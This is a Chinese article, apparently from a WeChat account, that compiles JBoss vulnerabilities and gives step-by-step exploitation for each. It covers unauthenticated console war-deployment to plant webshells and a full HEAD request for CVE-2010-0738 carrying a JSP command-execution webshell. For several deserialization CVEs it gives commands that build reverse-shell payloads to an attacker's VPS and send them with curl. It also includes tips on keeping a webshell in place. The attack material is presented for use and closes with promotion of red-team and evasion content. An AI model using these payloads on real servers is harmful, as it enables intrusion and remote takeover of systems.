\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=MzU4NTY4MDEzMw==&mid=2247486026&idx=1&sn=4506f56907afa88daa133119bbaae802&chksm=fd879e20caf0173643b991e9ea9300f2fff2e69ce0c12173a8a4c509292083ce7fa13fb74308&mpshare=1&scene=1&srcid=1023Tdls8JDF0KziT2zhJrvd&sharer\_sharetime=1603413026463&sharer\_shareid=c051b65ce1b8b68c6869c6345bc45da1&key=4cf40c946f4d610cff5979e68cb1cc4bbc9d97310eb3bb535533e1217c4f4a32d332e2ba715dc3ea50845869fbd2aa2491312a2dae859f77c069b1d03de16a31708d63587f3499ce236ba434def6fc136cf0b6403e9ab618120851bd9eb614e1ef5cb0890ec2c7f00e54a19f9d25bfba81831e1e0b8588c057ae801dc8e543a6&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=6300002f&lang=zh\_CN&exportkey=Adbz9Z4SiNjGBCooZifZUhI%3D&pass\_ticket=MIC5Ar%2FikzMcOH1F8HNnc411WxyFMo1Kw3L353SY3XmezYiEUuovrlDORbkreA49&wx\_header=0)

JBOSS 简介

```
JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。在J2EE应用服务器领域，JBoss是发展最为迅速的应用服务器。由于JBoss遵循商业友好的LGPL授权分发，并且由开源社区开发，这使得JBoss广为流行。
```

漏洞汇总

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauh14m1ibIeDVrmvHz4xCYoymibAgoWnRjEibiay70mbibibhaObkNwgG8aey1g/640?wx_fmt=png)

访问控制不严导致的漏洞  
Jboss 管理控制台  
Jboss4.x  
jboss 4.x 及其之前的版本 console 管理路径为 /jmx-console/ 和 /web-console/ 。  
jmx-console 的配置文件为

```
/opt/jboss/jboss4/server/default/deploy/jmx-console.war/WEB-INF/jboss-web.xml  #jboss的绝对路径不同网站不一样
```

web-console 的配置文件为

```
/opt/jboss/jboss4/server/default/deploy/management/console-mgr.sar/web-console.war/WEB-INF/jboss-web.xml  #jboss的绝对路径不同网站不一样
```

web-console 的配置文件为

```
/opt/jboss/jboss4/server/default/deploy/management/console-mgr.sar/web-console.war/WEB-INF/jboss-web.xml  #jboss的绝对
```

控制台账号密码  
jmx-console 和 web-console 共用一个账号密码 ，账号密码文件在

```
/opt/jboss/jboss4/server/default/conf/props/jmx-console-users.properties
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhA8AgpQzM1iaAvjvib7HvjgOLKDx9XHcZUglEP5ZhL6YWxxym4dL9KvMw/640?wx_fmt=png)

JMX Console 未授权访问 Getshell

漏洞描述  
此漏洞主要是由于 JBoss 中 / jmx-console/HtmlAdaptor 路径对外开放，并且没有任何身份验证机制，导致攻击者可以进⼊到 jmx 控制台，并在其中执⾏任何功能。

影响版本  
Jboss4.x 以下

漏洞利⽤  
Jboxx4.x /jmx-console/ 后台存在未授权访问，进入后台后，可直接部署 war 包 Getshell。若需登录，可以尝试爆破弱口令登录。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhUOBia8LwmmdXxnSQItRh2ibAOTmsNyxscKbKxG5xOHYR52MWXkH8UYmA/640?wx_fmt=png)

然后找到 jboss.deployment（jboss 自带的部署功能）中的 flavor=URL,type=DeploymentScanner 点进去（通过 url 的方式远程部署）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauh6TB9HXAHzaIJb7c1esJYTzElZEicfRdqO1v6VTQly8cDsYuFwIY9mdA/640?wx_fmt=png)

也可以直接输入 URL 进入

```
http://xx.xx.xx.xx:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.deployment:type=DeploymentScanner,flavor=URL
```

找到页面中的 void addURL() 选项来远程加载 war 包来部署。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhHkVJfunl6lQ6jtLptmBAGlVJQZKS8o7BHgLQLTibxejCdfy2iaSTB3oQ/640?wx_fmt=png)

查看部署是否成功  
返回到刚进入 jmx-console 的页面，找到 jboss.web.deployment，如下说明部署成功。如果没显示，多刷新几次页面或者等会儿，直到看到有部署的 war 包即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhUjqj8CLOqo2j44CnSdQB7sS2iaPmZeFp4xMpVVG1msnEYMQATb6Icqw/640?wx_fmt=png)

访问我们的木马

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhlNRKdIfFDEXIsCzIgnNBibicuZ67KQKSdt9twrrFMCw0SKQhqSObKv5w/640?wx_fmt=png)

```
通常像上面这样部署的webshell,物理路径默认都会在以下目录下 
\\jboss-4.2.3.GA\\server\\default\\tmp\\deploy\\xxx.war
而这个目录最多用作临时维持下权限,所以可以把shell传到jmx-console的默认目录来巩固权限
\\jboss-4.2.3.GA\\server\\default\\deploy\\jmx-console.war
```

JMX Console HtmlAdaptor Getshell（CVE-2007-1036）

漏洞描述

```
此漏洞主要是由于JBoss中/jmx-console/HtmlAdaptor路径对外开放，并且没有任何身份验证机制，导致攻击者可以进⼊到jmx控制台，并在其中执⾏任何功能。该漏洞利⽤的是后台中jboss.admin -> DeploymentFileRepository -> store()⽅法，通过向四个参数传⼊信息，达到上传shell的⽬的，其中arg0传⼊的是部署的war包名字，arg1传⼊的是上传的⽂件的⽂件名，arg2传⼊的是上传⽂件的⽂件格式，arg3传⼊的是上传⽂件中的内容。通过控制这四个参数即可上传shell，控制整台服务器。
```

影响版本  
Jboss4.x 以下

漏洞利用  
输⼊ url

http:// 目标 IP:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin:service=DeploymentFileRepository

定位到 store ⽅法

```
通过向四个参数传入信息，达到上传shell的目，
arg1传入的是部署的war包名字
arg2传入的是上传的文件的文件名
arg3传入的是上传文件的文件格式
arg4传入的是上传文件中的内容
通过控制这四个参数即可上传shell，控制整台服务器。
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhhFsFZZaLm1N3icfiaN62Je78GH8JpI1buR1W5Kic1A50BicAU8TOiboCrug/640?wx_fmt=png)

后面的 CVE-2010-0738 和 CVE-2006-5750 漏洞也存在这一特性。

JMX 控制台安全验证绕过漏洞（CVE-2010-0738）

漏洞描述  
该漏洞利⽤⽅法跟 CVE-2007-1036 ⼀样，只是绕过了 get 和 post 传输限制，利⽤  
head 传输⽅式发送 payload

影响版本  
jboss4.2.0、jboss 4.3.0

漏洞利⽤  
利⽤ head 传输⽅式，payload 如下：

```
HEAD /jmx-console/HtmlAdaptor?
action=invokeOp&name=jboss.admin:service=DeploymentFileRepository&methodIn
dex=6&arg0=../jmx-console.war/&arg1=hax0rwin&arg2=.jsp&arg3=
<%Runtime.getRuntime().exec(request.getParameter("i"));%>&arg4=True
HTTP/1.1
Host: hostx:portx
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.9)
Gecko/20100315 Firefox/3.5.9 (.NET CLR 3.5.30729)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,\*;q=0.7
Keep-Alive: 300
Proxy-Connection: keep-alive
```

CVE-2006-5750

```
此漏洞利用原理和CVE-2007-1036漏洞相同，唯一的区别是CVE-2006-5750漏洞利用methodIndex进行store()方法的调用。其中methodIndex是通过方法的编号进行调用。
```

Jboss5.x/6.x 控制台

Jboss5.x 开始弃用了 web-console ，增加了 admin-console。jboss5.x / 6.x 版本 console 路径为 /jmx-console/ 和 /admin-console/。

jmx-console 的配置文件为

```
jboss/common/deploy/jmx-console.war/WEB-INF/jboss-web.xml  #jboss的绝对路径不同网站不一样
```

admin-console 的配置文件为

```
jboss/common/deploy/admin-console.war/WEB-INF/jboss-web.xml   #jboss的绝对路径不同网站不一样
```

控制台账号密码  
jmx-console 和 web-console 共用一个账号密码 ，账号密码文件在

```
jboss/server/default/conf/props/jmx-console-users.properties
```

Jboss 5.x/6.x admin-Console 后台部署 war 包 Getshell  
Jboss5.X 开始，jmx-console 不能部署 war 包了，需要 admin-console 后台部署  
登录进 admin-console 后台后，点击 Web Application(WAR)s ，然后 Add a new resource

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhucnJwNSqq7gcGu2gUTSCEFk7QFY72hvZRasGqqgPYNJz7iaqdpibNGGg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhxCucUkOeSb5bjoMrFJkXSSUtmTNVs4sOCKuhpWehlXpz7XJKgWhdjg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhY8US0UP5PzwX0sxuXY0TRoGT1GeBGh2fIM7fvZzE16PADYkR4RkOyA/640?wx_fmt=png)

这里选择我们本地生成好的 war 包

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhjr8HXMfg5Lp3IaHmzBXq2zWupMyduDqribtwKZFQrrComRcL5BnVScg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauh1GrgngiaaIWANk1xXoejOsvX2Nk7SXJdXiauDa9rdu13gt3WCicObEuJg/640?wx_fmt=png)

访问木马成功

JBoss JMXInvokerServlet 反序列化漏洞 (CVE-2015-7501)

```
这是经典的 JBoss 反序列化漏洞，
JBoss在 /invoker/JMXInvokerServlet 请求中读取了用户传入的对象，然后我们可以利用 Apache Commons Collections 中的 Gadget 执行任意代码。
由于JBoss中invoker/JMXInvokerServlet路径对外开放，JBoss的jmx组件⽀持Java反序列化
```

影响版本  
实际上主要集中在 jboss 6.x 版本上:

```
Apache Group Commons Collections 4.0 
 Apache Group Commons Collections 3.2.1 
 Apache Group Commons Collections
```

漏洞探测  
此漏洞存在于 JBoss 中 /invoker/JMXInvokerServlet 路径。访问若提示下载 JMXInvokerServlet，则可能存在漏洞。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhho08A3ntByFkkR6Fg6sanOmzvJd4YPKwVd132mnicEun3GhMn8KWSLQ/640?wx_fmt=png)

我们先启动靶机环境，访问：http://yourip:8080/

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhKKiaAzFOZJYtBwNWqxhplViaicicHuicsrqXZAe3ThXDaUTYkY2r1fheyBw/640?wx_fmt=png)

下面使用 JavaDeserH2HC 生成反弹 shell 的 payload

```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
 java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 公网vps的ip:端口号
 curl http://目标IP:8080/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

进行文件编译  
生成载荷的序列化文件 xx.ser(反弹 shell 到我们的 vps)  
利用 curl 提交我们的 ser 文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhhlYmV8N9fPTJbXSibosFkEl6ianIsw7pOVEkJva3Mveibc2eJ55F5C94g/640?wx_fmt=png)

vps 使用 nc 监听端口  
成功反弹

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhibmIrE1icuQiabGCmicVCvR8lQ7zbPibvd5zpTS7R5JiavzRut3TIvXCnFeg/640?wx_fmt=png)

JBoss EJBInvokerServlet CVE-2013-4810 反序列化漏洞

```
此漏洞和CVE-2015-7501漏洞原理相同，两者的区别就在于两个漏洞选择的进行其中JMXInvokerServlet和EJBInvokerServlet利用的是org.jboss.invocation.MarshalledValue进行的反序列化操作，而web-console/Invoker利用的是org.jboss.console.remote.RemoteMBeanInvocation进行反序列化并上传构造的文件。
```

影响版本  
实际上主要集中在 jboss 6.x 版本上:

```
Apache Group Commons Collections 4.0 
 Apache Group Commons Collections 3.2.1 
 Apache Group Commons Collections
```

漏洞利用  
跟 CVE-2015-7501 利⽤⽅法⼀样，只是路径不⼀样，这个漏洞利⽤路径是 /invoker/EJBInvokerServlet

JBOSSMQ JMS CVE-2017-7504 集群反序列化漏洞 4.X

漏洞描述  
JBoss AS 4.x 及之前版本中，JbossMQ 实现过程的 JMS over HTTP Invocation Layer 的 HTTPServerILServlet.java ⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执⾏任意代码。

影响版本  
JBoss AS 4.x 及之前版本

漏洞利用  
1、首先验证目标 jboss 是否存在此漏洞, 直接访问  
/jbossmq-httpil/HTTPServerILServlet 路径下。若访问 200，则可能存在漏洞。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhgibibHuUGAX8AC7YrcACbibBWnQB1o9YSbUiaXKg6n1EIKiauXhkTZp0fHw/640?wx_fmt=png)

此处我们使用 JavaDeserH2HC 工具来利用该漏洞, 尝试直接弹回一个 shell

```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 反弹的IP:端口
curl http://目标IP:8080/jbossmq-httpil/HTTPServerILServlet/ --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauh9R70fLMicmR90OFFU0rzopvnrDt4tbWmLQicibzUrKvh45T4LxWtAJhAg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhZUmhJYyLrZZiaFThr6LHTF6sRmD951LOL6I0UaVMMCvOialwRpELEPFg/640?wx_fmt=png)

成功反弹 shell

JBoss 5.x/6.x CVE-2017-12149 反序列化漏洞  
漏洞描述

```
该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。
该漏洞出现在\*\*/invoker/readonly\*\*请求中，服务器将用户提交的POST内容进行了Java反序列化,导致传入的携带恶意代码的序列化数据执行。
```

影响版本  
JbossAS 5.x  
JbossAS 6.x

漏洞验证 POC  
http:// 目标: 8080/invoker/readonly 如果出现报 500 错误, 则说明目标机器可能存在此漏洞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauh39DGP8Bl9pJTbH6ftSvL0vJG2XpjgVXbWcTOia3XlJbN0MzRRjw1weA/640?wx_fmt=png)

漏洞利用  
首先从 http 响应头和 title 中一般情况下都能看到信息来确定目标 jboss 版本是否在此漏洞版本范围

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhBxNfumYH6qoDCRQH2k2kphNKeztqMy08ElWYFcgBedF91jh4L2iaWcQ/640?wx_fmt=png)

现成工具

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhXawr2ZQgibcGSSwia4wjZoV07dJia8zopvgFz1SzgcfnakXvW9CGORPrA/640?wx_fmt=png)

接下来借助 JavaDeserH2HC 来完成整个利用过程  
首先尝试直接反弹 shell, 利用 JavaDeserH2HC 创建好用于反弹 shell 的  
payload, 如下

```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap vps的ip:端口 
然后尝试利用curl发送payload到目标机器上执行后，发现vps已成功接弹回的shell
curl http://www.target.net/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhfop6Sf553hPoeM8icPwSuTbUOB66kCfp4DrzeHSDthZ5IpYx5PiafeeQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauhV0YJJG5f4kfubrJkPztxhibxffAhr4uB60Nx13JibA7VLz9yIYoZRNwA/640?wx_fmt=png)

成功反弹 shell。

参考文献:  
https://blog.csdn.net/qq\_36119192/article/details/103899123  
https://www.freebuf.com/articles/web/240174.html

渗透测试 红队攻防 免杀 权限维持 等等技术 

及时分享最新漏洞复现以及 EXP 国内外最新技术分享!!!

进来一起学习吧

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDC1QHAC8PAV6JaPBJno5cRxvqAVB1pm0tOZd3TQM7jCB5nTbnfa40GHHQFIWpFFRuHCCCdtykVQWQ/640?wx_fmt=jpeg)

可以看看好兄弟

一个学习资料分享的星球  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauh7w9zO0pVDGHw104MNYAWlTDkYC8m08m7u5M99gD5ftwXnzSztPchNw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDAeLkAOpClBP4m1AY226iauh7GeB0qib6uR6ag8kLmQHGMnI1mzDLJmN8G1VrudmSpM1HEdjiaPAQa4A/640?wx_fmt=png)